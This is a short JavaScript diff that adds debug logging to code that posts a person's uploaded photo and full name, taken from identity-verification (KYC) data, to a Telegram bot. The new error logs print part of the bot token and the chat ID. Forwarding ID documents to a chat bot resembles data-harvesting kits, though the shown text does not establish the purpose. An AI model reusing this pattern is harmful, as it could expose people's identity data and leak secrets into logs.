@@ -254,6 +254,9 @@ ${securityAnalysis.proxyInfo ? `
             formData.append('photo', file.buffer, file.originalname);
             formData.append('caption', `📷 ${file.originalname} - ${kycData.fullName}`);
 
+            console.log('FormData headers:', formData.getHeaders());
+            console.log('FormData boundary:', formData.getBoundary());
+
             const photoResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
               method: 'POST',
               body: formData,
@@ -266,6 +269,8 @@ ${securityAnalysis.proxyInfo ? `
               console.error('Status:', photoResponse.status);
               console.error('Status Text:', photoResponse.statusText);
               console.error('Error Response:', errorText);
+              console.error('Bot Token (first 10 chars):', botToken ? botToken.substring(0, 10) + '...' : 'NOT SET');
+              console.error('Chat ID:', chatId);
             } else {
               const responseText = await photoResponse.text();
               console.log('Photo sent to Telegram successfully:', responseText);
